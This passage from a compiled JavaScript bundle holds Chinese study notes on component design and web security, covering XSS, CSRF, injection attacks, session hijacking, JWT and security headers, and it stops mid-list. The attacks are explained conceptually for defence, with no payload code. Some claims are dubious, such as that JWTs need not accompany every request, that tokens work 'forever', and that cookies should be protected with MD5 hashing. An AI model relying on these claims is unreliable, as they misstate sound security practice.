组件间嵌套使用。组件可以嵌套使用，但嵌套后仍然是独立、松耦合的。\r\n\r\n### 组件间通信。主要指组件之间的函数调用或通信，例如A组件完成某个操作后希望B组件执行某个行为，这种情况就可以使用监听或观察者模式在B组件中注册该行为的事件监听或加入观察者，然后选择合适的时机在A组件中触发这个事件监听或通知观察者来触发B组件中的行为操作，而不是在A组件中直接拿到B组件的引用并直接进 行操作，因为这样组件之间的行为就会产生耦合。\r\n\r\n### 组件公用部分设计。组件的公用部分应该被抽离出来形成基础库，用来增加代码的复用性。\r\n\r\n### 组件的构建打包。构建工具能够自动解析和打包组件内容。\r\n\r\n### 异步组件的加载模式。在移动端，通常考虑到页面首屏，异步的场景应用非常广泛，所有异步组件不能和同步组件一起处理。这时可以将异步组件区别于普通组件的目录存放，并在打包构建时进行异步打包处理。\r\n\r\n### 组件继承与复用性。对于类似的组件要做到基础组件复用来减少重复编码。\r\n\r\n### 私有组件的统一管理。为了提高协作效率，可以通过搭建私有源的方式来统一管理组件库，例如使用包管理工具等。但这点即使在大的团队里面也很难实施，因为业务组件的实现常常需要定制化而且经常变更，这样维护组件库成本反而更大，目前可以做的是将公用的组件模块使用私有源管理起来。\r\n\r\n### 根据特定场景进行扩展或自定义。如果当前的组件框架不能满足需求，我们应该能够很便捷地拓展新的框架和样式，这样就能适应更多的场景需求。比如在通过目录管理组件的方案下，既可以使用MVVM框架进行开发，也可以使用Virtual DOM框架进行开发，但要保持基本的规范结构不变。\r\n\r\n",Es={data:function(){return{MainComponent:ws}}},Ts=Es,ks=Object(u["a"])(Ts,_s,xs,!1,null,"0e3ebb3f",null),Cs=ks.exports,js=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",{},[t("q-markdown",{attrs:{src:n.MainComponent}})],1)},Ms=[],Rs='# 安全\r\n\r\n## Web安全\r\n\r\n### XSS\r\n\r\n- 危害\r\n\r\n\t- Cookie劫持\r\n\t- 构造POST、GET请求\r\n\t- XSS钓鱼\r\n\t- 识别用户浏览器、识别用户安装的软件\r\n\t- CSS History Hack\r\n\t- 获取用户真实IP\r\n\t- XSS Worm\r\n\r\n- 构造\r\n\r\n\t- 利用字符编码\r\n\t- 绕过长度限制\r\n\t- base标签\r\n\t- window.name\r\n\r\n- 防御\r\n\r\n\t- HttpOnly\r\n\t- 输入检查\r\n\t- 输出检查\r\n\r\n### CSRF\r\n\r\n- 危害\r\n\r\n\t- 伪造请求\r\n\t- CSRF Worm\r\n\r\n- 防御\r\n\r\n\t- 验证码\r\n\t- Referer Check\r\n\t- Anti CSRF Token\r\n\r\n### ClickJacking\r\n\r\n- 危害\r\n\r\n\t- 视觉欺骗，诱导用户在该网页上操作\r\n\t- 图片覆盖攻击\r\n\t- 拖拽劫持和数据窃取\r\n\t- 触屏劫持\r\n\r\n- 构造\r\n\r\n\t- 调整iframe页面的位置，是用户恰好点击在iframe页面的一些功能性按钮上\r\n\r\n- 防御\r\n\r\n\t- frame busting\r\n\t- X-Frame-Options(优)\r\n\r\n### 注入攻击\r\n\r\n- SQL注入\r\n- 数据库攻击技巧\r\n- 正确防御SQL注入\r\n- 其他注入攻击\r\n\r\n### 文件上传漏洞\r\n\r\n- 一般场景\r\n\r\n\t- 上传Web脚本能够被服务器解析\r\n\r\n- 解决方案\r\n\r\n\t- 文件上传目录设置为不可执行\r\n\t- 判断文件类型\r\n\t- 使用随机数改写文件名和文件路径\r\n\t- 单独设置文件服务器的域名\r\n\r\n### 认证与会话\r\n\r\n### 拒绝服务攻击\r\n\r\n### 浏览器\r\n\r\n- 同源策略\r\n\r\n\t- 端口号、IP地址、子域名、协议必须相同的两个origin才为同源。\r\n\t- 跨域\r\n\r\n\t\t- window.name\r\n\t\t- jsonp\r\n\t\t- nginx转发\r\n\t\t- Node中间层\r\n\t\t- 配置CORS\r\n\t\t- websocket\r\n\r\n- Cookie策略\r\n\r\n\t- Cookie种类\r\n\r\n\t\t- Session Cookie\r\n\r\n\t\t\t- 存于浏览器进程的内存空间里（服务端不设置Expire和max-age时触发）\r\n\r\n\t\t- Third-party Cookie\r\n\r\n\t\t\t- 存于本地\r\n\r\n\t\t- 浏览器从一个域的页面加载另外一个域的资源，部分浏览器会阻止Third-party Cookie的发送\r\n\r\n### HTML5安全\r\n\r\n- 新标签、新事件可能带来新XSS攻击\r\n\r\n\t- 例如vedio的onloadedmetadata、ondurationchange等\r\n\r\n- 设置iframe的sandbox属性来增强应用使用iframe安全性\r\n\r\n\t- allow-same-origin\r\n\t- allow-top-navigation\r\n\t- allow-forms\r\n\t- allow-scripts\r\n\r\n- Link Type: noreferrer\r\n\r\n\t- 给link标签设置rel=\'noreferrer\'后，浏览器请求时将不再发送referrer\r\n\r\n- Canvas\r\n\r\n\t- 可以识别图片验证码\r\n\r\n- CORS\r\n- postMessage\r\n\r\n\t- postMessage允许每一个window对象向其他窗口发送文本消息，从而实现跨窗口的消息传递。\r\n\r\n- Web Storage\r\n\r\n## JWT(Json Web token)\r\n\r\n### （1）认识JWT\r\n\r\n- jwt是为了在网络应用环境传递声明而执行的一种基于json的开放标准。\r\n- jwt被用来在身份提供者和服务提供者间传递被认证的用户身份信息，简单来说，就是用来验证身份的手段，例如登录校验，像我们之前用的cookie。\r\n- jwt可以使用HMAC算法或者是RSA的公私秘钥对来进行签名，来保证信息的可靠性。\r\n\r\n### （2）应用场景\r\n\r\n- 在例如身份验证场景中，用户一旦登录，接下来的每个请求都会包含jwt，用来验证身份信息。由于通信双方使用jwt对数据进行编码，它的信息是经过签名的，所以可以确保信息的安全性。\r\n\r\n### （3）JWT对比cookie\r\n\r\n- Cookie缺点\r\n\r\n\t- 客户端发请求给服务器，服务器种植cookie后，每次请求都会带上cookie，浪费带宽\r\n\t- cookie不能跨服务器访问，不支持跨域\r\n\t- 服务器要对登录的用户对象进行存储，浪费服务器内存\r\n\r\n- JWT优点\r\n\r\n\t- （1）jwt是不基于状态的，不需要每次请求都带上token，节约流量\r\n\t- （2）可以跨服务端，可以共用\r\n\t- （3）体积小，因而传输速度快\r\n\t- （4）传输方式多样，可以通过 URL/POST 参数/HTTP 头部 等方式传输\r\n\t- （4）严谨的结构化。它自身（在 payload 中）就包含了所有与用户相关的验证消息，如用户可访问路由、访问有效期等信息，服务器无需再去连接数据库验证信息的有效性，并且 payload 支持为你的应用而定制化\r\n\t- （5）支持跨域验证，多应用于单点登录。\r\n\r\n\t\t- 单点登录（Single Sign On）：在多个应用系统中，用户只需登陆一次，就可以访问所有相互信任的应用。\r\n\t\t- 用户登陆之后，服务器会返回给他一个 token，由他保存在本地，在这之后的对服务器的访问都要带上这串 JWT ,来获得访问服务器相关路由、服务及资源的权限。比如单点登录就比较多地使用了 JWT，因为它的体积小，并且简单处理（使用 HTTP 头带上 Bearer 属性 + token ）就可以支持跨域操作。\r\n\r\n\t- （6）比 cookie 更支持原生移动端应用\r\n\r\n\t\t- 原生的移动应用对 cookie 与 session 的支持不够好，而对 token 的方式支持较好。\r\n\r\n\t- （7）验证解耦，无需使用特定的身份验证方案， token 可以在任何地方生成\r\n\r\n\t\t- 只要拥有生成 token 所需的验证信息，在何处都可以调用 token 生成接口，无需繁琐的耦合的验证操作，可谓是一次生成，永久使用。\r\n\r\n\t- （8）充分依赖无状态 API ，契合 RESTful 设计原则\r\n\r\n\t\t- 有状态\r\n\r\n\t\t\t- server 保存了 client 的请求状态， server 会通过 client 传递的 sessionID 在其 session 作用域内找到之前交互的信息并应答。\r\n\r\n\t\t- 无状态\r\n\r\n\t\t\t- 无状态是 RESTful 架构设计的一个非常主要的原则。无状态 API 的每一个请求都是独立的，它要求由客户端保存所有需要的认证信息，每次发请求都要带上自己的状态\r\n\r\n\t- （9）易于实现 CDN，将静态资源分布式管理\r\n\r\n\t\t- 在传统的 session 验证中，服务端必须保存 session ID，用于与用户传过来的 cookie 验证。而在一开始保存 session ID 时， 只会保存在一台服务器上，所以只能由一个 server 应答，就算其他服务器有空闲也无法应答，因此也利用不到分布式服务器的优点。\r\n\t\t- 而 JWT 依赖的是在客户端本地保存验证信息，不需要利用服务器保存的信息来验证，所以任意一台服务器都可以应答，服务器的资源也被较好地利用。\r\n\r\n### （4）JWT结构\r\n\r\n- Header头部\r\n\r\n\t- { typ:\'jwt\' ,alg:\'HS256\' }\r\n alg:当前用的什么算法加密的；使用Base64Url编码组成了JWT结构的第一部分\r\n\r\n- PlyLoad负载\r\n\r\n\t- 存放有效信息的地方\r\n\r\n- Signature签名\r\n\r\n\t- 创建签名需要使用编码后的header和payload以及一个秘钥；例如如果希望使用HMAC SHA256算法，那么签名应该使用下列方式创建\r\n\t- HMACSHA256( base64UrlEncode(header) + "." + base64UrlEncode(payload), secret)\r\n\r\n- 完整的jwt格式的输出是以 . 分隔的三段Base64编码 密钥secret是保存在服务端的，服务端会根据这个密钥进行生成token和验证，所以需要保护好。\r\n\r\n### （5）例子\r\n\r\n- 流程图\r\n\r\n- 流程\r\n\r\n\t- （1）首先，拥有某网站账号的某 client 使用自己的账号密码发送 post 请求 login\r\n\t- （2）由于这是首次接触，server 会校验账号与密码是否合法，如果一致，则根据密钥生成一个 token 并返回\r\n\t- （3）client 收到这个 token 并保存在本地的 localStorage。\r\n\t- （4）在这之后，需要访问一个受保护的路由或资源时，而只要附加上你保存在本地的 token（通常使用 Bearer 属性放在 Header 的 Authorization 属性中），server 会检查这个 token 是否仍有效，以及其中的校验信息是否正确，再做出相应的响应。\r\n\r\n### 理解 JSON Web Tokens (JWT) 的 5 个简单步骤\r\n\r\n- JWT的定义\r\n\r\n\t- JSON Web令牌（JWT）是一种 JSON 对象（双引号字符串被认为是有效的 JSON 对象），是一套开放的标准定义的两方之间表示一组信息的安全方式。 JWT 由头部（header），负载（payload）和签名（signature）组成。\r\n\t- 简单地说，JWT只是一个具有以下格式的字符串：\r\n\r\n- 实际场景\r\n\r\n\t- 此示例中的三个不同的实体是用户，应用程序服务器和身份验证服务器。 验证服务器将向用户提供 JWT。 使用 JWT，用户可以安全地与应用程序通信。\r\n\r\n\t\t- 在该示例中，用户首先使用认证服务器的登录系统登录认证服务器（例如，用户名和密码，Facebook登录，Google登录等）。 然后，身份验证服务器创建 JWT并将其发送给用户。 当用户对应用程序进行 API 调用时，用户将传递 JWT 以及 API 调用。 在这个实例中，应用程序服务器将可以验证传入的 JWT 是否是由身份验证服务器创建的（验证过程将在稍后更详细地说明）。当用户使用附加的 JWT 进行API 调用时，应用程序可以使用 JWT 来验证该 API 调用是否来自经过身份验证的用户。\r\n\r\n- 构建JWT\r\n\r\n\t- Step 1. 创建 Header\r\n\r\n\t\t- JWT 的 Header 部分包含有关如何计算 JWT 签名的信息，是一个以下形式的 JSON 对象\r\n\r\n\t\t- 在上面的 JSON 中，“typ”键的值指定对象是JWT，“alg”键的值指定用于创建 JWT 签名的算法。 在示例中，我们使用 HMAC-SHA256算法（一种使用密钥的散列算法）来计算签名\r\n\r\n\t- Step 2. 创建 Payload\r\n\r\n\t\t- JWT 的 payload 部分时是存储在 JWT 内的数据。在我们的示例中，身份验证服务器创建一个JWT，其中存储有用户信息，特别是用户ID。\r\n\r\n\t\t- 在我们的示例中，我们只将一个声明放入 payload 中。 你可以根据需要添加任意数量的声明。JWT 规定了7个官方字段，供选用。\r\n\r\n\t\t\t- iss (issuer)：签发人\r\n\t\t\t- exp (expiration time)：过期时间\r\n\t\t\t- sub (subject)：主题\r\n\t\t\t- aud (audience)：受众\r\n\t\t\t- nbf (Not Before)：生效时间\r\n\t\t\t- iat (Issued At)：签发时间\r\n\t\t\t- jti (JWT ID)：编号\r\n\r\n\t\t- 除了官方字段，你还可以在这个部分定义私有字段。请记住，数据的大小将影响JWT的总体大小，这通常不是问题，但过大的 JWT 可能会对性能产生负面影响并导致延迟。\r\n\r\n\t- Step 3. 创建 Signature\r\n\r\n\t\t- 使用某算法，其所做的是 base64url 对在步骤1和2中创建的header和payload进行编码。然后，算法将得到的编码字符串用“点”（.）连在一起。\r\n\r\n\t\t- 在示例中，header 和 payload 被 base64url 编码，然后，在加入周期的编码头和编码有效载荷上应用带有密钥的指定签名算法，我们得到签名所需的散列数据。 在我们的例子中，这意味着在数据字符串上应用 HS256 算法，并将密钥设置为字符串“secret”，以获取 hashedData字符串。 之后，通过base64url 编码 hashedData 字符串\r\n\r\n\t- Step 4. 把 JWT 的三个部分组合在一起\r\n\r\n\t\t- 我们只需要组合以上的三个部分，用点（.）分隔它们。\r\n\r\n\t\t\t- // JWT Token\r\neyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VySWQiOiJiMDhmODZhZi0zNWRhLTQ4ZjItOGZhYi1jZWYzOTA0NjYwYmQifQ.-xN_h82PHVTCMA9vdoHrcZxH-x5mb11y1537t3rGzcM\r\n\r\n\t- Step 5. 校验 JWT\r\n\r\n\t\t- 在我们的示例中，我们使用的是由 HS256 算法签名的JWT，其中只有身份验证服务器和应用服务器知道密钥。当应用程序设置其身份验证过程时，应用程序服务器从身份验证服务器接收密钥。由于应用程序知道密钥，当用户对应用程序进行带有 JWT 附加的 API 调用时，应用程序可以执行与 JWT 上的步骤3相同的签名算法。然后，应用程序可以验证从其自己的哈希操作获得的签名是否与 JWT 本身上的签名匹配（即，它与由认证服务器创建的 JWT 签名匹配）。如果签名匹配，则表示 JWT 有效，表示 API 调用来自可信源。否则，如果签名不匹配，则表示收到的 JWT 无效，这可能是对应用程序的潜在攻击的指示。因此，通过验证 JWT，应用程序在其自身和用户之间添加了一层信任。\r\n\r\n- JWT 如何保护我们的数据？\r\n\r\n\t- 要理解使用 JWT 的目的不是以任何方式隐藏或模糊数据，而是为了证明发送的数据是由真实的来源创建的。\r\n\t- 由于 JWT 仅被签名和编码，并且由于 JWT 未加密，因此 JWT 不能保证敏感数据的安全性。\r\n\r\n## Web 的攻击技术\r\n\r\n### 针对 Web 的攻击技术\r\n\r\n- 简单的 HTTP 协议本身并不存在安全性问题,因此协议本身几乎不会成为攻击的对象\r\n- 在运作的 Web 应用背后却隐藏着各种容易被攻击者滥 用的安全漏洞的 Bug\r\n- 在 Web 应用中,从浏览器那接收到的 HTTP 请求的全部内容,都可以在客户端自由地变更、篡改\r\n- 在 HTTP 请求报文内加载攻击代码,就能发起对 Web 应用的攻击\r\n- 主动攻击(active attack)是指攻击者通过直接访问 Web 应用,把攻击代码传入的攻击模式\r\n- 被动攻击(passive attack)是指利用圈套策略执行攻击代码的攻击模式。\r\n\r\n### 因输出值转义不完全引发的安全漏洞\r\n\r\n- 跨站脚本攻击(Cross-Site Scripting,XSS)是指通过存在安全漏洞的 Web 网站注册用户的浏览器内运行非 法的 HTML 标签或 JavaScript 进行的一种攻击\r\n- 利用虚假输入表单骗取用户个人信息。\r\n- 利用脚本窃取用户的 Cookie 值, 被害者在不知情的情况下, 帮助攻击者发送恶意请求。\r\n- 显示伪造的文章或图片\r\n- 跨站脚本攻击案例\r\n- 在动态生成 HTML 处发生\r\n- 对用户 Cookie 的窃取攻击\r\n- SQL 注入(SQL Injection)是指针对 Web 应用使用的数据库,通过运行非法的 SQL 而产生的攻击。\r\n- 非法查看或篡改数据库内的数据\r\n- 规避认证\r\n- 执行和数据库服务器业务关联的程序等\r\n- OS 命令注入攻击(OS Command Injection)是指通过 Web 应用,执行非法的操作系统命令达到攻击的目 的\r\n- HTTP 首部注入攻击(HTTP Header Injection)是指攻击者通过在响应首部字段内插入换行,添加任意响应首部或主体的一种攻击。\r\n- 设置任何 Cookie 信息\r\n- 重定向至任意 URL\r\n- 显示任意的主体( HTTP 响应截断攻击)\r\n- HTTP 首部注入攻击案例\r\n- 邮件首部注入(Mail Header Injection)是指 Web 应用中的邮件发送功能,攻击者通过向邮件首部 To 或 Subject 内任意添加非法内容发起的攻击\r\n- 目录遍历(Directory Traversal)攻击是指对本无意公开的文件目录,通过非法截断其目录路径后,达成访问 目的的一种攻击\r\n- 远程文件包含漏洞(Remote File Inclusion)是指当部分脚本内容需要从其他文件读入时,攻击者利用指定外 部服务器的 URL充当依赖文件,让脚本读取之后,就可运行任意脚本的一种攻击\r\n\r\n### 因设置或设计上的缺陷引发的安全漏洞\r\n\r\n- 强制浏览\r\n\r\n\t- 强制浏览(Forced Browsing)安全漏洞是指,从安置在 Web 服务器的公开目录下的文件中,浏览那些原本 非自愿公开的文件\r\n\t- 泄露顾客的个人信息等重要情报\r\n\t- 泄露原本需要具有访问权限的用户才可查阅的信息内容\r\n\t- 泄露未外连到外界的文件\r\n\r\n- 不正确的错误消息处理\r\n\r\n\t- Web 应用不必在用户的浏览画面上展现详细的错误消息。对攻击者来说,详细的错误消息有可能给他们下一 次攻击以提示\r\n\r\n- 开放重定向\r\n\r\n\t- 开放重定向(Open Redirect)是一种对指定的任意 URL 作重定向跳转的功能。\r\n\r\n### 因会话管理疏忽引发的安全漏洞\r\n\r\n- 会话劫持(Session Hijack)是指攻击者通过某种手段拿到了用户的会话 ID,并非法使用此会话 ID 伪装成用 户,达到攻击的目的\r\n- 对以窃取目标会话 ID 为主动攻击手段的会话劫持而言,会话固定攻击(Session Fixation)攻击会强制用户 使用攻击者指定的会话 ID,属于被动攻击。\r\n- 跨站点请求伪造(Cross-Site Request Forgeries,CSRF)攻击是指攻击者通过设置好的陷阱,强制对已完 成认证的用户进行非预期的个人信息或设定信息等某些状态更新,属于被动攻击。\r\n\r\n### 其他安全漏洞\r\n\r\n- 密码破解攻击(Password Cracking)即算出密码,突破认证\r\n- 通过网络的密码试错\r\n\r\n\t- 穷举法\r\n\t- 字典攻击\r\n\r\n- 对已加密密码的破解(指攻击者入侵系统, 已获得加密或散列处理的密码数据的情况)\r\n- 点击劫持(Clickjacking)是指利用透明的按钮或链接做成陷阱,覆盖在 Web 页面之上。然后诱使用户在不 知情的情况下,点击那个链接访问内容的一种攻击手段。这种行为又称为界面伪装(UI Redressing)。\r\n- DoS 攻击(Denial of Service attack)是一种让运行中的服务呈停止状态的攻击\r\n- 后门程序(Backdoor)是指开发设置的隐藏入口,可不按正常步骤使用受限功能\r\n\r\n## web安全机制\r\n\r\n### 基础安全知识\r\n\r\n- XSS(跨站脚本攻击)\r\n\r\n\t- XSS通常是由带有页面可解析内容的数据未经处理直接插入到页面上解析导致的。\r\n\t- 存储型XSS的攻击脚本常常是由前端提交的数据未经处理直接存储到数据库然后从数据库中读取出来后又直接插入到页面中所导致的\r\n\t- 反射型XSS可能是在网页URL参数中注入了可解析内容的数据而导致的，如果直接获取URL中不合法的并插入页面中则可能出现页面上的XSS攻击\r\n\t- MXSS（也叫DOM XSS）则是在渲染DOM属性时将攻击脚本插入DOM属性中被解析而导致的\r\n\t- XSS主要的防范方法是验证输入到页面上所有内容来源数据是否安全，如果可能含有脚本标签等内容则需要进行必要的转义。\r\n\r\n- SQL(结构化查询语言)注入\r\n\r\n\t- SQL注入攻击主要是因为页面提交数据到服务器端后，在服务器端未进行数据验证就将数据直接拼接到SQL语句中执行，因此产生执行与预期不同的现象。\r\n\t- 主要防范措施是对前端网页提交的数据内容进行严格的检查校验。\r\n\r\n- CSRF(跨站请求伪造)\r\n\r\n\t- CSRF是指非源站点按照源站点的数据请求格式提交非法数据给源站点服务器的一种攻击方法。\r\n\t- 非源站点在取到用户登录验证信息的情况下，可以直接对源站点的某个数据接口进行提交，如果源站点对该提交请求的数据来源未经验证，该请求可能被成功执行，这其实并不合理。通常比较安全的是通过页面Token（令牌）提交验证的方式来验证请求是否为源站点页面提交的，来阻止跨站伪请求的发生。\r\n\r\n### 请求劫持与HTTPS\r\n\r\n- DNS劫持\r\n\r\n\t- DNS劫持通常是指攻击者劫持了DNS服务器，通过某些手段取得某域名的解析记录控制权，进而修改此域名的解析结果，导致用户对该域名地址的访问由原IP地址转入到修改后的指定IP地址的现象，其结果就是让正确的网址不能解析或被解析指向另一网站IP，实现获取用户资料或者破坏原有网站正常服务的目的。DNS劫持一般通过篡改DNS服务器上的域名解析记录，来返回给用户一个错误的DNS查询结果实现。\r\n\t- DNS劫持症状可能为在某些地区的用户在成功连接宽带网络后，访问域名为www.a.com的网站，出现的却是www.b.com网站的内容，因为DNS服务器www.a.com域名的解析结果被修改指向了www.b.com网站指向的IP地址。\r\n\r\n- HTTP劫持\r\n\r\n\t- HTTP劫持是指，在用户浏览器与访问的目的服务器之间所建立的网络数据传输通道中从网关或防火墙层上监视特定数据信息，当满足一定的条件时，就会在正常的数据包中插入或修改成为攻击者设计的网络数据包，目的是让用户浏览器解释“错误”的数据，或者以弹出新窗 口的形式在使用者浏览器界面上展示宣传性广告或者直接显示某块其他的内容。\r\n\t- 这种情况下一般用户请求源网站的IP地址及网站加载的内容和脚本都是正确的，但是在网站内容请求返回的过程中，可能被ISP（Internet Service Provider，互联网服务提供商）劫持修改，最终在浏览器页面上添加显示一些广告等内容信息。\r\n\r\n- 对于这些情况，网站开发者常常就无法通过修改网站代码程序等手段来进行防范了。请求劫持唯一可行的预防方法就是尽量使用HTTPS协议来访问目标网站。\r\n\r\n### HTTPS协议通信过程\r\n\r\n- HTTPS协议是通过加入SSL（Secure Sockets Layer）层来加密HTTP数据进行安全传输的HTTP协议，同时启用默认的443端口进行数据传输。\r\n- 公钥（Public Key）与私钥（Private Key）是通过一种加密算法得到的密钥对（即一个公钥和一个与之匹配的私钥），公钥是密钥对中公开的部分，私钥则是非公开的部分。公钥通常用于会话加密、验证数字签名或者加密可以用相应私钥解密的数据。通过这种算法得到的密钥对保证是唯一的。使用这个密钥对的时候，如果用其中一个密钥加密一段数据，则必须用另一个密钥解密。\r\n\r\n### HTTPS协议解析\r\n\r\n- HTTPS请求报文和HTTP的请求报文区别不大，但是在请求的头部域字段多了upgrade-insecure-requests，该头部字段指令很关键，它可以用于让页面打开的后续请求自动从 HTTP请求升级到HTTPS请求。否则如果使用HTTPS来加载HTML文件，而HTML中加载的是HTTP链接的资源文件，则会产生Mixed Content类型的错误，并且无法加载资源。\r\n- 在服务器端响应头域中也要加入下面的头域来返回给浏览器，否则浏览器默认安全显示策略会阻塞内容并提示block-all-mixed-content类型的错误。\r\nheader("Content-Security-Policy: upgrade-insecure-requests") ;\r\n\r\n### 浏览器Web安全控制\r\n\r\n- X-XSS-Protection\r\n\r\n\t- 这个head消息头设置主要是用来防止浏览器中的反射性XSS问题的发生，通过这种方式可以在浏览器层面增加前端网页的安全性。\r\n\t- X-XSS-Protection通常设置如下。\r\n\r\nX-XSS-Protection: 1;\r\nmode=block 0 –关闭对浏览器的xss防护；1 –开启xss防护\r\nmode=block可以开启XSS防护并通知浏览器阻止而不是过滤用户注入的XSS脚本\r\n\r\n- Strict-Transport-Security\r\n\r\n\t- Strict Transport Security（STS）是一种用来配置浏览器和服务器之间安全通信的机制，主要用来防止中间者攻击，因为它强制所有的通信都使用HTTPS，在普通的HTTP报文请求中配置STS是没有作用的，而且攻击者也能更改这些值。\r\n\t- 为了防止这样的现象发生，很多浏览器内置了一个配置STS的站点列表，在Chrome浏览器下可以通过访问chrome://net-internals/#hsts查看浏览器中站点的STS列表，一般STS的配置实现如下。\r\n\r\nmax-age=31536000 –告诉浏览器将域名缓存到STS列表中，只有这些特定域名下的资源内容才允许被加载，时\r\n间是一年\r\nmax-age=31536000;\r\nincludeSubDomains;\r\npreload; –告诉浏览器将域名缓存到STS列表里面并且包含所有的子域名，并可支持预加载，时间是一年\r\nmax-age= 0 –告诉浏览器移除在STS缓存里的域名，或者不保存当前域名\r\n\r\n- Content-Security-Policy\r\n\r\n\t- 我们简称它为CSP，这是一种由开发者定义的安全策略性声明，通过CSP所约束的的规则设定，浏览器只可以加载指定可信的域名来源的内容（这里的内容可以是脚本、图片、iframe、font、style等等远程资源）。通过CSP协定，Web只能加载指定安全域名下的资源文件，保证运行时的内容总处于一个安全的环境中。\r\n\r\n- Access-Control-Allow-Origin\r\n\r\n\t- Access-Control-Allow-Origin是从Cross Origin Resource Sharing（CORS）中分离出来的。这个头部设置是决定哪些网站可以访问当前服务器资源的设置，通过定义一个通配符或域名来决定是单一的网站还是所有网站可以访问服务器的资源。\r\n\t- 需要注意的是，如果服务器端定义了通配符“＊”，那么服务端的Access-Control-Allow-Credentials（是否允许请求时携带验证信息）选项就无效了，此时用户浏览器中的不同域Cookie信息将默认不会在服务器请求里发送（即如果需要实现带Cookie进行跨域请求，则要明确地配置允许来源的域，使用任意域的配置是不合法的）。\r\n\r\nAccess-Control-Allow-Origin : * *– 通配符允许任何远程资源来访问 Access-Control-Allow-Origin\r\n的内容  \r\nhttp://www.domain.com – 只允许特定站点才能访问当前资源\r\n\t- Access-Control-Allow-Origin常常作为跨域共享设置的一种实现方式，其他常用的跨域手段还有： JSONP(JSON with Padding)、 script标签跨域、 window.postMessage、修改 document.domain跨子域、 window.name跨域和 WebSocket跨域等。\r\n\r\n##  XSS\r\n\r\n### 跨站脚本攻击(Cross Site Scripting)，缩写为XSS\r\n\r\n- （1）XSS的定义：跨域脚本注入，攻击者通过某种方式将恶意代码注入到网页上，然后其他用户观看到被注入的页面内容后会受到特定攻击\r\n\r\n\t- 恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。\r\n\r\n- （2）XSS的原理\r\n\r\n\t- 1.攻击者对含有漏洞的服务器发起XSS攻击（注入JS代码）。\r\n\t- 2.诱使受害者打开受到攻击的服务器URL。\r\n\t- 3.受害者在Web浏览器中打开URL，恶意脚本执行。\r\n\r\n- （3）XSS的攻击方式\r\n\r\n\t- 1.反射型：（直接通过URL注入，而且很多浏览器都自带防御）\r\n\r\n\t\t- 发出请求时，XSS代码出现在URL中，作为输入提交到服务器端，服务器端解析后响应，XSS随响应内容一起返回给浏览器，最后浏览器解析执行XSS代码，这个过程就像一次发射，所以叫反射型XSS\r\n\t\t- 反射型XSS漏洞的攻击步骤\r\n\r\n\t\t\t- （1） 用户正常登录Web应用程序，登录成功会得到一个会话信息的cookie：\r\n\r\n\t\t\t- （2） 攻击者将含有攻击代码的URL发送给被攻击人；\r\n\r\n\t\t\t- （3） 用户打开攻击者发送过来的ULR；\r\n\t\t\t- （4） Web应用程序执行用户发出的请求；\r\n\t\t\t- （5） 后台对URL参数未做任何过滤处理，返回给客户端，前端直接从url上获取参数，会导致URL上的js代码执行\r\n\t\t\t- （6） 例子中攻击者使用的攻击代码作用是将用户的cookie信息发送到cookie_save.php这个文件来记录下来；\r\n\t\t\t- （7） 攻击者在得到用户的cookie信息后，将可以利用这些信息来劫持用户的会话。以该用户的身份进行登录。\r\n\r\n\t- 2.存储型：（存储到DB后读取时注入）\r\n\r\n\t\t- 存储型XSS和反射型的XSS差别就在于，存储型的XSS提交的代码会存储在服务器端（数据库，内存，文件系统等），下次请求目标页面时不用再提交XSS代码。\r\n\r\n\t- 3. DOM-based XSS\r\n\r\n\t\t- 代码\r\n\r\n\t\t- 理解\r\n\r\n- （4）XSS的防御措施\r\n\r\n\t- （1）输出进行编码：\r\n\r\n\t\t- HTML实体编码\r\n\r\n\t\t\t- 在 HTML 中，某些字符是预留的，比如不能使用小于号（<）和大于号（>），这是因为浏览器会误认为它们是标签。如果希望正确地显示预留字符，我们必须在 HTML 源代码中使用字符实体（character entities）。当然还另一个重要原因，有些字符在 ASCII 字符集中没有定义，因此需要使用字符实体来表示，比如中文。\r\n\t\t\t- 最常见的五种实体编码\r\n\r\n\t\t- 和输入过滤类似，不过是从输出上着手，数据输出到页面时，经过HtmlEncoder等工具编码，这样就不会存在直接输出可执行的脚本了\r\n\r\n\t- （2）输入过滤：\r\n\r\n\t\t- 不信任用户的任何输入，过滤其中的“<”、“>”、“/”等可能导致脚本注入的特殊字符， 或者过滤“script”、“javascript”等脚本关键字，或者对输入数据的长度进行限制等等， 还得考虑攻击者使用十六进制编码来输入脚本的方式。\r\n\t\t- 而在一些前端框架中，都会有一份 decodingMap， 用于对用户输入所包含的特殊字符或标签进行编码或过滤，如 <，>，script，防止 XSS 攻击：\r\n\r\n\t- （3）Cookie设置http-only（防止劫取 Cookie）：\r\n\r\n\t\t- HttpOnly 最早由微软提出，至今已经成为一个标准。浏览器将禁止页面的Javascript 访问带有 HttpOnly 属性的Cookie。\r\n\t\t- 上文有说到，攻击者可以通过注入恶意脚本获取用户的 Cookie 信息。通常 Cookie 中都包含了用户的登录凭证信息，攻击者在获取到 Cookie 之后，则可以发起 Cookie 劫持攻击。所以，严格来说，HttpOnly 并非阻止 XSS 攻击，而是能阻止 XSS 攻击后的 Cookie 劫持攻击。\r\n\r\n\t- （4）Cookie防盗：\r\n\r\n\t\t- 在 Cookie 中防止放入用户名和密码，对 Cookie 信息进行 MD5 等算法进行多次散列存放，必要时还要对 ip 和 cookie 进行绑定，一旦检测异常，立马让用户重新登录；\r\n\r\n## CSRF\r\n\r\n### CSRF（跨站请求伪造）（cross-site request forgery）\r\n\r\n- （1）CSRF的定义：冒用用户身份，进行恶意操作\r\n\r\n\t-  攻击者盗用了你的身份，以你的名义发送恶意请求，对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作，比如以你的名义发送邮件、发消息，盗取你的账号，添加系统管理员，甚至于购买商品、虚拟货币转账等。\r\n\r\n- （2）CSRF的原理\r\n\r\n\t- 1. 用户打开浏览器，访问受信任网站A，输入用户名和密码请求登录网站A；\r\n\t- 2.在用户信息通过验证后，网站A产生Cookie信息并返回给浏览器，此时用户登录网站A成功，可以正常发送请求到网站A；\r\n\t- 3. 用户未退出网站A之前，在同一浏览器中，打开一个TAB页访问网站B；\r\n\t- 4. 网站B接收到用户请求后，返回一些攻击性代码，并发出一个请求要求访问第三方站点A；\r\n\t- 5. 